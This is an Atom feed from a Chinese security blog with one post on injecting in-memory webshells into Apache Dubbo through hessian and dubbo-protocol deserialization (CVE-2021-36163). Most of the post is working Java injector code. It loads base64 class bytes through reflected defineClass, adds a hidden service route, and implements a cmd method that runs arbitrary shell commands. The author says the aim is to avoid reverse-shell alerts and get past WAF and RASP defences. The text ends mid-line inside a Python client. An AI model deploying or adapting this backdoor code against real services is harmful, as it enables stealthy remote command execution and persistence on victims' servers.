<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J1anFen &#39; blog</title>
  
  <subtitle>Information is beautiful</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-10-05T07:23:01.155Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dubbo中使用hessian_http/dubbo协议注入内存马</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dubbo%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dubbo%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2021-10-05T06:18:59.000Z</published>
    <updated>2021-10-05T07:23:01.155Z</updated>
    
    <content type="html"><![CDATA[<p>学习源码顺便玩玩内存马加深印象，比如某些环境不想触发反弹shell触发告警可以写入内存马方便快速操作（命令执行，文件管理，绕rasp,waf等）</p><a id="more"></a><h2 id="漏洞测试环境："><a href="#漏洞测试环境：" class="headerlink" title="漏洞测试环境："></a>漏洞测试环境：</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/" target="_blank" rel="external nofollow noopener noreferrer">https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/</a></p><p>dubbo使用hessian协议对外暴露服务时触发反序列化漏洞<br>Issue 2: Unsafe deserialization in providers using the Hessian protocol (CVE-2021-36163/GHSL-2021-095)</p><h2 id="代码环境："><a href="#代码环境：" class="headerlink" title="代码环境："></a>代码环境：</h2><p><a href="https://github.com/apache/dubbo-samples" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/apache/dubbo-samples</a><br>dubbo-sample-http</p><p>基于CVE-2021-36163，http over hessian</p><p>http-provider.xml 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:registry</span> <span class="attr">address</span>=<span class="string">"zookeeper://$&#123;zookeeper.address:127.0.0.1&#125;:2181"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  设置jetty或者tomcat服务器都可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"hessian"</span> <span class="attr">port</span>=<span class="string">"8085"</span> <span class="attr">server</span>=<span class="string">"jetty"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"demoService"</span> <span class="attr">class</span>=<span class="string">"org.apache.dubbo.samples.http.impl.DemoServiceImpl"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">"org.apache.dubbo.samples.http.api.DemoService"</span> <span class="attr">ref</span>=<span class="string">"demoService"</span> <span class="attr">protocol</span>=<span class="string">"hessian"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="内存马前置知识"><a href="#内存马前置知识" class="headerlink" title="内存马前置知识"></a>内存马前置知识</h2><p>注入内存马无非就是修改关键变量中添加恶意的路由和对应的服务映射,所以一步步回溯寻找可修改关键变量的点是最主要的。</p><h3 id="dubbo-SPI"><a href="#dubbo-SPI" class="headerlink" title="dubbo SPI"></a>dubbo SPI</h3><p><a href="https://blog.csdn.net/top_code/article/details/51934459" target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/top_code/article/details/51934459</a></p><p>dubbo中获取各种对象很多场景使用SPI(service provider interface) ，spi核心的作用就是解耦代码。用户直接调用接口即可直接调用实现代码，调用的最终实现从配置，远程等方式读取。</p><p>单从上面链接中的例子看不出此模式的优势，举个栗子：比如某场景调用信息模块只需要调用接口代码即可获取信息，后端通过服务发现,webservice服务(Eureka,Feign)会将请求转发到其他模块执行，这样就完全进行了代码解耦。</p><p>dubbo中到处都用到了SPI的调用方式，也对jdk原生的spi模式进行了优化,dubbo的扩展机制是dubbo实现扩展各种协议和各种反序列化方法的基础：<br><a href="https://dubbo.apache.org/zh/docsv2.7/dev/source/dubbo-spi/" target="_blank" rel="external nofollow noopener noreferrer">https://dubbo.apache.org/zh/docsv2.7/dev/source/dubbo-spi/</a></p><h4 id="扩展加载器特点："><a href="#扩展加载器特点：" class="headerlink" title="扩展加载器特点："></a>扩展加载器特点：</h4><p>dubbo会将所有待被使用的扩展均缓存然后按需调用，所以代码中会经常看到如下类似代码:</p><ul><li><p>从接口加载指定名称实例:</p><p>#getExtension </p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("hessian")</span><br></pre></td></tr></table></figure><ul><li>自适应(adaptive)</li></ul><p>决定要注入的目标扩展。 目标扩展的名称由 URL 中传递的参数决定，参数名称由该方法给出。<br>Decide which target extension to be injected. The name of the target extension is decided by the parameter passed in the URL, and the parameter names are given by this method.</p><p>比如接口Protocol中export和refer就存在@Adaptive注解,可以根据url设置的协议动态选择协议:</p><p>dubbo:// hessian:// rmi://,</p><p>@SPI(“dubbo”)默认为dubboProtocol协议：<br><img src="/images/2021/10/20210930002003069_1999676093.png" alt></p><p><a href="https://github.com/YunaiV/dubbo/blob/6b8e51ac55880a0f10a34f297d0869fcdbb42369/dubbo-common/src/main/java/com/alibaba/dubbo/common/extension/Adaptive.java" target="_blank" rel="external nofollow noopener noreferrer">@adaptive</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtensionLoader.getExtensionLoader(Protocol<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span></span><br></pre></td></tr></table></figure><ul><li>自激活(active)<br>内存马无需用到这部分知识，忽略。</li></ul><h2 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h2><p>通过断点发现 org.apache.dubbo.rpc.protocol.hessian.HessianProtocol.HessianHandler#handle：<br>skeletonMap中存在路由和调用方法对应关系，所以寻找可以修改skeletonMap参数的点即可：</p><p><img src="/images/2021/10/20210930004559595_437019501.png" alt></p><p>skeletonMap.put下断点一路回溯看是否存在静态对象可获取最终修改skeletonMap：<br><img src="/images/2021/10/20210930004851977_592680567.png" alt></p><p>最终发现dubbo通过PROTOCOL对象进行export方法调用最终会触发修改skeletonMap，此时可以看出PROTOCOL是通过spi方式调用接口获取的自适应扩展：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Protocol PROTOCOL = (Protocol)ExtensionLoader.getExtensionLoader(Protocol<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span>;</span><br></pre></td></tr></table></figure><p>参考以下代码:<br>org/apache/dubbo/dubbo/2.7.10/dubbo-2.7.10.jar!/org/apache/dubbo/config/ServiceConfig.class:424</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoker&lt;?&gt; invoker = PROXY_FACTORY.getInvoker(<span class="keyword">this</span>.ref, <span class="keyword">this</span>.interfaceClass, registryURL.addParameterAndEncoded(<span class="string">"export"</span>, url.toFullString()));</span><br><span class="line">DelegateProviderMetaDataInvoker wrapperInvoker = <span class="keyword">new</span> DelegateProviderMetaDataInvoker(invoker, <span class="keyword">this</span>);</span><br><span class="line">Exporter&lt;?&gt; exporter = PROTOCOL.export(wrapperInvoker);</span><br><span class="line"><span class="keyword">this</span>.exporters.add(exporter);</span><br></pre></td></tr></table></figure><ul><li>jndi反序列化时代码，将接口和实现类base64编码通过defineClass加载，最终export：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.URL;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.bytecode.Proxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.utils.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Invoker;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Protocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.ProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemInject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">"decodeBuffer"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">clazz</span>.<span class="title">newInstance</span>(), <span class="title">str</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"java.util.Base64"</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">"getDecoder"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">"decode"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">decoder</span>, <span class="title">str</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MemInject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取hessianProtocol对象</span></span><br><span class="line">            Protocol protocolObj = ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("hessian");</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建路由规则 x.x.x.x:8085/sb</span></span><br><span class="line">            URL url = <span class="keyword">new</span> URL(<span class="string">"hessian"</span>, <span class="string">"0.0.0.0"</span>, <span class="number">8085</span>, <span class="string">"sb"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取ProxyFactory对象最终需要生成invoker对象</span></span><br><span class="line">            ProxyFactory proxyFactoryObj = ExtensionLoader.getExtensionLoader(ProxyFactory<span class="class">.<span class="keyword">class</span>).<span class="title">getAdaptiveExtension</span>()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恶意类，接口加载</span></span><br><span class="line">            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 替换为base64编码的类和接口字符串</span></span><br><span class="line">            String extendServiceStr = <span class="string">"[extendService_interface_code]"</span>;</span><br><span class="line">            String extendServiceImpl = <span class="string">"[extendServiceImpl_code]"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 生成字节码</span></span><br><span class="line">            <span class="keyword">byte</span>[] extServiceBytes = base64Decode(extendServiceStr);</span><br><span class="line">            <span class="keyword">byte</span>[] extServiceImplBytes = base64Decode(extendServiceImpl);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用dubbo原生获取classloader方法，由于dubbo中使用代理类会出现同时加载一个类，如果使用不同类加载器则会抛出错误</span></span><br><span class="line">            ClassLoader proxyClassLoader = ClassUtils.getClassLoader(Proxy<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">            Class extServiceClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceBytes.length)&#125;);</span><br><span class="line">            Class extServiceImplClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceImplBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceImplBytes.length)&#125;);</span><br><span class="line"></span><br><span class="line">            Invoker evilInvoker = proxyFactoryObj.getInvoker(extServiceImplClazz.newInstance(), extServiceClazz, url);</span><br><span class="line"></span><br><span class="line">            protocolObj.export(evilInvoker);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意接口和实现类：</p><ul><li>DemoService：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DemoService</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">cmd</span><span class="params">(String c)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>DemoServiceImpl:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServiceImpl</span> <span class="keyword">implements</span> <span class="title">DemoService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">cmd</span><span class="params">(String c)</span> </span>&#123;</span><br><span class="line">        String result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"windows"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, c&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, c&#125;;</span><br><span class="line">            result = <span class="keyword">new</span> java.util.Scanner(<span class="keyword">new</span> ProcessBuilder(cmd).start().getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            result = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用之前设置的接口方法,即可触发注入的内存马：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianRequest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String urlName = <span class="string">"http://127.0.0.1:8085/sb"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        HessianProxyFactory factory = <span class="keyword">new</span> HessianProxyFactory();</span><br><span class="line">        <span class="comment">// 开启方法重载</span></span><br><span class="line">        factory.setOverloadEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HelloHessian helloHession = (HelloHessian) factory.create(</span><br><span class="line">                HelloHessian<span class="class">.<span class="keyword">class</span>, <span class="title">urlName</span>)</span>;</span><br><span class="line"></span><br><span class="line">        String result = helloHession.cmd(<span class="string">"ifconfig"</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dubbo原生协议注入内存马"><a href="#dubbo原生协议注入内存马" class="headerlink" title="dubbo原生协议注入内存马"></a>dubbo原生协议注入内存马</h2><p>dubbo版本小于 2.7.6</p><p>dubbo provider.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">"dubbo"</span> <span class="attr">port</span>=<span class="string">"20880"</span> <span class="attr">host</span>=<span class="string">"127.0.0.1"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>20880端口反序列化注入同理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.URL;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.bytecode.ClassGenerator;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.common.utils.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Exporter;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Invoker;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.Protocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.ProxyFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.protocol.dubbo.DubboExporter;</span><br><span class="line"><span class="keyword">import</span> org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemInjectDubbo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">"decodeBuffer"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">clazz</span>.<span class="title">newInstance</span>(), <span class="title">str</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"java.util.Base64"</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">"getDecoder"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">"decode"</span>, String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">decoder</span>, <span class="title">str</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MemInjectDubbo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 由于代理类中存在wrapper所以getExtension获取的为QosWrapperProcotol，此时需要获取内部filed中被嵌套的真实dubboProtocol</span></span><br><span class="line">            Protocol protocolObj = ExtensionLoader.getExtensionLoader(Protocol.class).getExtension("dubbo");</span><br><span class="line">        <span class="comment">// 设置查询DubboProtocol次数，超过4次则跳出，避免无限查询</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                i--;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Field protocolField = protocolObj.getClass().getDeclaredField(<span class="string">"protocol"</span>);</span><br><span class="line">                    protocolField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    protocolObj = (Protocol) protocolField.get(protocolObj);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (protocolObj.getClass() != DubboProtocol<span class="class">.<span class="keyword">class</span> || <span class="title">i</span> &lt; 0)</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置端口和调用类名</span></span><br><span class="line">            URL dubboURL = <span class="keyword">new</span> URL(<span class="string">"dubbo"</span>, <span class="string">"0.0.0.0"</span>, <span class="number">20880</span>, <span class="string">"x.extendService"</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 获取jdk原生ProxyFactory, 避免其他扩展其他代码干扰比如javassistProxyFactory会在生成代码时干扰代码逻辑</span></span><br><span class="line">            ProxyFactory proxyFactoryObj = ExtensionLoader.getExtensionLoader(ProxyFactory.class).getExtension("jdk");</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]&#123;byte[].class, int.class, int.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 替换为自己想注入的类</span></span><br><span class="line">            String extendServiceStr = <span class="string">"[base64_classbytes]"</span>;</span><br><span class="line">            String extendServiceImpl = <span class="string">"[base64_classbytes]"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] extServiceBytes = base64Decode(extendServiceStr);</span><br><span class="line">            <span class="keyword">byte</span>[] extServiceImplBytes = base64Decode(extendServiceImpl);</span><br><span class="line"></span><br><span class="line">            ClassLoader proxyClassLoader = ClassUtils.getClassLoader(ClassGenerator<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">            Class extServiceClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceBytes.length)&#125;);</span><br><span class="line">            Class extServiceImplClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceImplBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceImplBytes.length)&#125;);</span><br><span class="line"></span><br><span class="line">            Invoker&lt;?&gt; invoker = proxyFactoryObj.getInvoker(extServiceImplClazz.newInstance(), extServiceClazz, dubboURL);</span><br><span class="line"></span><br><span class="line">            URL url = invoker.getUrl();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// export service. org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.export</span></span><br><span class="line">            <span class="comment">// dubboProtocol#export方法中将暴露接口和启动服务写在同一个函数，没预想到动态加载接口，所以这里不直接调用export而是抽取部分export代码反射修改exporterMap添加恶意对象映射关系</span></span><br><span class="line">            Field exporterMapField = protocolObj.getClass().getSuperclass().getDeclaredField(<span class="string">"exporterMap"</span>);</span><br><span class="line">            exporterMapField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map&lt;String, Exporter&lt;?&gt;&gt; exporterMap = (Map&lt;String, Exporter&lt;?&gt;&gt;) exporterMapField.get(protocolObj);</span><br><span class="line"></span><br><span class="line">            Method serviceKeyMethod = protocolObj.getClass().getSuperclass().getDeclaredMethod(<span class="string">"serviceKey"</span>, URL<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            serviceKeyMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            String key = (String) serviceKeyMethod.invoke(protocolObj, url);</span><br><span class="line"></span><br><span class="line">            DubboExporter exporter = <span class="keyword">new</span> DubboExporter(invoker, key, exporterMap);</span><br><span class="line">            exporterMap.put(key, exporter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/2021/10/20211005141515036_2088009975.png" alt></p><p>客户端调用即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"><span class="keyword">from</span> dubbo.java_class <span class="keyword">import</span> JavaString</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">'127.0.0.1'</span>, <span class="number">20880</span>)</span><br><span class="line"><span class="comment"># 构造一个Java Object为com.demo.test的参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = 